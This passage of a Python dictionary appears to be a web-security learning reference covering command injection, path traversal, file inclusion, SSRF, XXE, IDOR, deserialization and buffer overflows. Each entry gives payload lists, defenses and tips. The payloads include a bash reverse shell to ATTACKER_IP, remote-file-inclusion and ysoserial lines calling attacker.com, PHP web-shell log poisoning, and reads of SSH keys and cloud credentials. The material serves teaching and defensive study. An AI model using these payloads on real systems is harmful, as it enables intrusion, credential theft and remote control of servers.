
  # ════════════════════════════════════════════════════════
  # MASTERY BLOCK 3 — WEB APP VULNERABILITIES
  # ════════════════════════════════════════════════════════

  "command injection": {
    "title": "Command Injection — Executing OS Commands via Web Applications",
    "tldr": "When user input is passed unsanitized to OS command execution functions, you can execute arbitrary shell commands on the server.",
    "what": (
      "Command injection occurs when a web application passes user-controlled data directly "
      "to system shell commands without proper sanitization. The attacker injects OS command "
      "separators (; && || | ` $()) to chain additional commands."
    ),
    "how": (
      "Vulnerable PHP example:\n"
      "  $output = shell_exec('ping -c 4 ' . $_GET['host']);\n\n"
      "Attacker input: 127.0.0.1; cat /etc/passwd\n"
      "Executes: ping -c 4 127.0.0.1; cat /etc/passwd\n\n"
      "Common injection separators:\n"
      "  ; — execute after the first command\n"
      "  && — execute if first command succeeds\n"
      "  || — execute if first command fails\n"
      "  | — pipe output of first to second\n"
      "  ` ` or $() — command substitution\n"
      "  \\n — newline injection"
    ),
    "commands": {
      "Basic test":                "; id",
      "Whoami test":               "| whoami",
      "Blind test (time-based)":   "; sleep 5",
      "Blind OOB (DNS)":           "; nslookup attacker-domain.com",
      "Reverse shell via RCE":     "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
      "URL-encoded injection":     "%3B+id  (URL encode the ;)",
      "Bypass filter (newline)":   "%0a id",
      "Bypass filter (backtick)":  "`id`",
    },
    "defense": "NEVER pass user input to shell functions. Use subprocess arrays (not strings). Input whitelist validation. Use language-level libraries instead of system() calls.",
    "tips": [
      "Try ALL separators — different systems filter different ones",
      "Blind injection: use time delays (sleep 5) or DNS callbacks to confirm execution",
      "Burp Suite Intruder can fuzz all injection points systematically",
      "OWASP WSTG has detailed command injection test cases",
    ],
  },

  "path traversal": {
    "title": "Path Traversal (Directory Traversal) — Reading Arbitrary Files",
    "tldr": "Manipulating file path parameters with ../ sequences to read files outside the intended web directory.",
    "what": (
      "Path traversal (also called directory traversal) occurs when user-controlled input "
      "is used to construct file paths without proper validation. Using ../ sequences, "
      "an attacker can traverse up the directory tree and read sensitive files like "
      "/etc/passwd, SSH keys, application configs with credentials, or source code."
    ),
    "how": (
      "Vulnerable code: readfile('/var/www/uploads/' . $_GET['file']);\n\n"
      "Attack: ?file=../../../../etc/passwd\n"
      "Reads: /var/www/uploads/../../../../etc/passwd → /etc/passwd\n\n"
      "Bypass techniques:\n"
      "  URL encode: ../ → %2e%2e%2f\n"
      "  Double encode: ../ → %252e%252e%252f\n"
      "  Null byte: ../../../../etc/passwd%00.jpg (PHP < 5.3)\n"
      "  Unicode: ../ → ..%c0%af or ..%ef%bc%8f\n"
      "  Mixed: ....// (if filter strips ../)"
    ),
    "commands": {
      "Basic Linux":            "?file=../../../../etc/passwd",
      "Basic Windows":          "?file=..\\..\\..\\windows\\win.ini",
      "SSH keys":               "?file=../../../../root/.ssh/id_rsa",
      "App config":             "?file=../../../../var/www/html/config.php",
      "Nginx config":           "?file=../../../../etc/nginx/nginx.conf",
      "Apache config":          "?file=../../../../etc/apache2/apache2.conf",
      "URL encoded":            "?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "Double encoded":         "?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    },
    "defense": "Canonicalize paths and validate against allowed directory (chroot), whitelist allowed files, avoid user input in file paths, use indirect file references (IDs)",
    "tips": [
      "After /etc/passwd, try /etc/shadow, ~/.ssh/id_rsa, /proc/self/environ",
      "On Windows, try C:\\Windows\\win.ini or C:\\inetpub\\wwwroot\\web.config",
      "Application config files often contain database credentials",
      "Burp Suite Intruder with SecLists path traversal wordlists automates this",
    ],
  },

  "file inclusion": {
    "title": "File Inclusion (LFI/RFI) — Including Arbitrary Files in Web Apps",
    "tldr": "Local File Inclusion (LFI) reads local server files. Remote File Inclusion (RFI) includes and executes remote PHP files. RFI = instant RCE.",
    "what": (
      "File inclusion vulnerabilities occur when user input controls which file is included/executed. "
      "LFI reads local files (path traversal), potentially leading to RCE via log poisoning or "
      "PHP wrappers. RFI includes remote files — since they execute as PHP, it's instant RCE."
    ),
    "how": (
      "LFI: include($_GET['page'] . '.php');\n"
      "Attack: ?page=../../../../etc/passwd%00  (null byte to strip .php)\n\n"
      "LFI → RCE via log poisoning:\n"
      "  1. Inject PHP into Apache access log: curl 'http://target/?<?php system($_GET[cmd]); ?>'\n"
      "  2. Include the log: ?page=../../../../var/log/apache2/access.log&cmd=id\n\n"
      "PHP wrappers for LFI:\n"
      "  php://filter: Read PHP source code encoded in Base64\n"
      "  php://input: Execute POST data as PHP (requires allow_url_include)\n"
      "  data://: Execute inline base64-encoded PHP\n\n"
      "RFI: allow_url_include=On required\n"
      "Attack: ?page=http://attacker.com/shell.php"
    ),
    "commands": {
      "Basic LFI":                  "?page=../../../../etc/passwd",
      "PHP filter (read source)":   "?page=php://filter/convert.base64-encode/resource=index",
      "Log poisoning (inject)":     "curl -A '<?php system($_GET[cmd]); ?>' http://target.com/",
      "Log poisoning (trigger)":    "?page=../../../../var/log/apache2/access.log&cmd=id",
      "PHP input (POST RCE)":       "?page=php://input  [POST: <?php system('id'); ?>]",
      "Data wrapper":               "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==&cmd=id",
      "RFI":                        "?page=http://attacker.com/shell.php",
      "RFI via FTP":                "?page=ftp://attacker.com/shell.php",
    },
    "defense": "Never use user input in include/require paths, whitelist allowed files, disable allow_url_include, PHP open_basedir restriction, WAF",
    "tips": [
      "PHP filter wrapper lets you read PHP source files that would normally execute",
      "Log poisoning is the most common LFI→RCE path — check Apache and Nginx logs",
      "Try /proc/self/fd/0 through /proc/self/fd/20 as additional LFI targets",
      "LFI in session files: inject PHP into session → include session file",
    ],
  },

  "ssrf": {
    "title": "SSRF — Server-Side Request Forgery",
    "tldr": "Making the server fetch URLs on your behalf. Used to scan internal networks, hit AWS metadata, and bypass firewalls.",
    "what": (
      "Server-Side Request Forgery (SSRF) occurs when a web application fetches remote resources "
      "based on user-supplied URLs without validation. The attacker makes the SERVER send requests "
      "— to internal services, cloud metadata endpoints, or localhost — from a trusted position "
      "inside the network perimeter."
    ),
    "how": (
      "Classic SSRF attack vectors:\n"
      "  1. Cloud metadata (most critical): http://169.254.169.254/latest/meta-data/ (AWS)\n"
      "     Returns IAM role credentials, EC2 metadata, potentially full cloud takeover\n"
      "  2. Internal port scanning: http://internal-host:6379/ (test Redis, DB, etc.)\n"
      "  3. Localhost services: http://localhost:8080/admin (hit internal admin panels)\n"
      "  4. File reads: file:///etc/passwd\n\n"
      "Bypass techniques:\n"
      "  IP encoding: 127.0.0.1 → 2130706433 (decimal) → 0x7f000001 (hex)\n"
      "  DNS rebinding: use your domain that resolves to 127.0.0.1\n"
      "  URL redirection: your server redirects to internal URL\n"
      "  IPv6: http://[::1]:80/"
    ),
    "commands": {
      "AWS metadata (classic)":     "url=http://169.254.169.254/latest/meta-data/",
      "AWS IMDSv2 token":           "url=http://169.254.169.254/latest/api/token (PUT first)",
      "AWS IAM creds":              "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
      "GCP metadata":               "url=http://metadata.google.internal/computeMetadata/v1/",
      "Internal port scan":         "url=http://internal-server:PORT/  (check for 200 vs error)",
      "Localhost admin":            "url=http://127.0.0.1:8080/admin",
      "File read":                  "url=file:///etc/passwd",
      "Bypass (decimal IP)":        "url=http://2130706433/  (= 127.0.0.1)",
    },
    "defense": "Whitelist allowed domains/IPs, block metadata endpoint IPs (169.254.x.x), network egress filtering from app servers, validate scheme (no file://, no gopher://)",
    "tips": [
      "Cloud metadata endpoint is the highest-priority SSRF target — always check it first",
      "Blind SSRF: use Burp Collaborator or interactsh to detect requests you can't see",
      "Redis (6379), Elasticsearch (9200), and internal Kubernetes APIs are common SSRF targets",
      "IMDSv2 requires a PUT request first to get a token — but many apps still use IMDSv1",
    ],
  },

  "xxe": {
    "title": "XXE — XML External Entity Injection",
    "tldr": "Injecting malicious XML entity declarations to read local files, perform SSRF, or trigger denial of service via the Billion Laughs attack.",
    "what": (
      "XXE (XML External Entity) injection occurs when an XML parser processes user-supplied "
      "XML that defines external entities. External entities can reference local files or "
      "remote URLs — the parser fetches and returns the content. This enables file reading, "
      "SSRF, and in some configurations RCE via server-side includes or Jar: wrapper."
    ),
    "how": (
      "XXE payload structure:\n"
      "  <?xml version='1.0' encoding='UTF-8'?>\n"
      "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
      "  <root><data>&xxe;</data></root>\n\n"
      "The parser replaces &xxe; with the content of /etc/passwd.\n\n"
      "Blind XXE (out-of-band):\n"
      "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/?c=SSRF_CALLBACK'>]>\n"
      "  Use Burp Collaborator to detect the outbound request\n\n"
      "Billion Laughs (DoS):\n"
      "  Recursive entity expansion that exhausts memory"
    ),
    "commands": {
      "File read":              "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>",
      "Windows file read":      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><data>&xxe;</data>",
      "SSRF via XXE":           "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><data>&xxe;</data>",
      "Blind OOB (Burp Collab)":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://COLLABORATOR_URL/'>]><data>&xxe;</data>",
      "PHP filter via XXE":     "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/config.php'>]><data>&xxe;</data>",
    },
    "defense": "Disable external entity processing in XML parser config (FEATURE_SECURE_PROCESSING), use JSON instead of XML where possible, whitelist allowed data",
    "tips": [
      "Look for any endpoint that accepts XML: SOAP APIs, file uploads (SVG, DOCX, XLSX all contain XML)",
      "SVG file uploads are extremely common XXE vectors — SVG is XML",
      "Blind XXE: use Burp Collaborator to detect OOB callbacks you can't see in responses",
      "DocX/XLSX/PPTX are ZIP files containing XML — unzip and inject entity declarations",
    ],
  },

  "idor": {
    "title": "IDOR — Insecure Direct Object Reference",
    "tldr": "Accessing objects you shouldn't by manipulating IDs in requests. One of the most common and impactful web vulnerabilities.",
    "what": (
      "IDOR occurs when an application uses user-controlled identifiers (IDs, filenames, GUIDs) "
      "to access objects without verifying that the current user is authorized to access THAT "
      "specific object. Changing /api/user/1234 to /api/user/1235 gives you someone else's data."
    ),
    "how": (
      "IDOR attack types:\n"
      "  URL parameter: /user?id=123 → change to /user?id=124\n"
      "  Path parameter: /api/orders/ORD-001 → change to /api/orders/ORD-002\n"
      "  JSON body: {'account_id': 12345} → change the ID\n"
      "  Cookie/header: user_id=123 in a cookie\n"
      "  File download: /download?file=report_12345.pdf → enumerate other IDs\n\n"
      "Non-sequential IDs:\n"
      "  UUIDs look random but may still be predictable\n"
      "  Use Burp to capture another account's ID from leaked references\n"
      "  Check if GUIDs are v1 (time-based) — can be predicted"
    ),
    "commands": {
      "Burp Intruder ID fuzz":     "# Send request to Intruder, mark ID as payload, fuzz numeric range",
      "Compare accounts":          "# Create 2 accounts, use Account A to access Account B's IDs",
      "Horizontal privesc":        "# Regular user accesses another user's /api/account/ID",
      "Vertical privesc":          "# Regular user accesses /api/admin/users/",
      "Mass assignment test":      "# Add 'isAdmin': true to JSON body — see if server accepts it",
      "API endpoint discover":     "# Look at JS source for hidden API endpoints and their parameters",
    },
    "defense": "Server-side authorization checks on EVERY object access (NEVER trust client-supplied IDs for authorization), use UUIDs instead of sequential IDs, activity logging",
    "tips": [
      "Always test IDOR with TWO accounts — you need Account A to access Account B's resources",
      "Check ALL references to IDs: URL, body, headers, cookies",
      "Horizontal IDOR (user→user) and vertical IDOR (user→admin) are different impact levels",
      "GUIDs don't prevent IDOR — you still need server-side authorization checks",
    ],
  },

  "deserialization": {
    "title": "Insecure Deserialization — RCE via Object Injection",
    "tldr": "Manipulating serialized objects to achieve Remote Code Execution. Often leads to instant SYSTEM/root.",
    "what": (
      "Deserialization converts stored/transmitted data back into objects. When applications "
      "deserialize user-controlled data without validation, attackers can craft malicious "
      "serialized objects that execute arbitrary code during the deserialization process. "
      "Java, PHP, Python, and .NET are all commonly vulnerable."
    ),
    "how": (
      "How it works:\n"
      "  Java: ObjectInputStream.readObject() triggers __readObject() in gadget chains\n"
      "  PHP: unserialize() triggers __wakeup() and __destruct() magic methods\n"
      "  Python: pickle.loads() executes __reduce__ method\n"
      "  .NET: BinaryFormatter.Deserialize() triggers gadget chains\n\n"
      "Attack process:\n"
      "  1. Find serialized data (base64 rO0AB = Java, O: = PHP, \\x80\\x04 = Python pickle)\n"
      "  2. Use ysoserial (Java) or PHPGGC (PHP) to generate malicious payload\n"
      "  3. Submit payload — server deserializes it, executing your command"
    ),
    "commands": {
      "Identify Java serial":      "# Base64: rO0AB... | Hex: ACED0005",
      "ysoserial Java RCE":        "java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/?c=$(id)' | base64",
      "PHPGGC PHP gadget":         "php phpggc/phpggc -l  # list gadget chains",
      "PHPGGC payload":            "php phpggc/phpggc Laravel/RCE1 system id | base64",
      "Python pickle RCE":         "# import pickle, os; class Exploit: def __reduce__(self): return os.system, ('id',)",
      "Detect .NET viewstate":     "# Look for __VIEWSTATE parameter — may be deserializable",
      "Burp test":                 "# Send serialized data to Burp Repeater, modify and observe responses",
    },
    "defense": "Never deserialize untrusted data, use JSON/YAML instead of native serialization, digital signatures on serialized data, deserialization firewall (Java agent)",
    "tips": [
      "ysoserial is the go-to for Java deserialization — has 30+ gadget chains",
      "Look for base64-encoded data in cookies, POST bodies, or hidden form fields",
      "Blind deserialization: use DNS callbacks (Burp Collaborator) to confirm execution",
      "PHPGGC works for PHP frameworks (Laravel, Symfony, Guzzle, etc.)",
    ],
  },

  "buffer overflow": {
    "title": "Buffer Overflow — The Classic Memory Corruption Vulnerability",
    "tldr": "Writing more data than a buffer can hold to overwrite adjacent memory, including return addresses. The foundation of binary exploitation.",
    "what": (
      "A buffer overflow occurs when a program writes data beyond the allocated buffer "
      "boundaries, overwriting adjacent memory. On the stack, this can overwrite the saved "
      "return address — controlling where execution jumps next. This is the foundation of "
      "most binary exploitation. Key concepts: stack layout, EIP/RIP control, shellcode, "
      "NOP sleds, Return Oriented Programming (ROP)."
    ),
    "how": (
      "Stack buffer overflow mechanics:\n"
      "  Stack frame: [local vars][saved EBP][return addr][arguments]\n"
      "  Overflow writes past local vars → overwrites saved EBP → overwrites return addr\n"
      "  Control EIP/RIP → redirect execution to your shellcode or ROP chain\n\n"
      "Exploitation process:\n"
      "  1. Find overflow: crash the app with a large input (cyclic pattern)\n"
      "  2. Find offset: identify exactly how many bytes to reach return address\n"
      "  3. Control EIP: place a JMP ESP address to redirect to shellcode\n"
      "  4. Deliver shellcode: place after the return address in the buffer\n\n"
      "Modern protections to bypass:\n"
      "  ASLR: Address randomization → leak a memory address first\n"
      "  NX/DEP: Non-executable stack → use ROP chains\n"
      "  Stack Canaries: Random value before return addr → need leak or bruteforce\n"
      "  PIE: Position Independent Executable → need leak for full ASLR bypass"
    ),
    "commands": {
      "Cyclic pattern (pwndbg)":   "cyclic 200  # generate pattern",
      "Find offset":               "cyclic -l 0x61616164  # find offset from crash EIP value",
      "GDB with PEDA":             "gdb -q ./binary → run → info registers",
      "Check protections":         "checksec ./binary  (or checksec in pwndbg)",
      "Find JMP ESP":              "msf-nasm_shell → JMP ESP → find address with mona.py",
      "Generate shellcode":        "msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python -b '\\x00'",
      "Pwntools skeleton":         "from pwn import *; p = process('./binary'); p.sendline(b'A'*offset + p32(ret_addr))",
      "ret2libc (ASLR bypass)":    "# Leak libc address via format string → calc system() offset → ret2system",
    },
    "tools": {
      "pwntools":   "Python exploit development framework — p32/p64, cyclic, process, remote",
      "pwndbg":     "GDB plugin with heap/stack visualization and exploit helpers",
      "PEDA":       "Python Exploit Development Assistance for GDB",
      "ROPgadget":  "Find ROP gadgets in binary for ASLR/NX bypass chains",
      "checksec":   "Check binary protections (ASLR, NX, PIE, canary, RELRO)",
    },
    "defense": "Compile with stack canaries (-fstack-protector), enable ASLR (/proc/sys/kernel/randomize_va_space=2), NX/DEP (non-executable stack), PIE, use safe C functions (strncpy vs strcpy)",
    "tips": [
      "Always run checksec first — the protections determine your exploitation strategy",
      "pwntools makes exploit development much faster than raw Python",
      "ret2libc is the standard ASLR bypass for 32-bit binaries",
      "ROP chains are required when NX/DEP is enabled — find gadgets with ROPgadget",
      "Practice on OverTheWire Narnia (basic) and pwn.college (advanced)",
    ],
  },

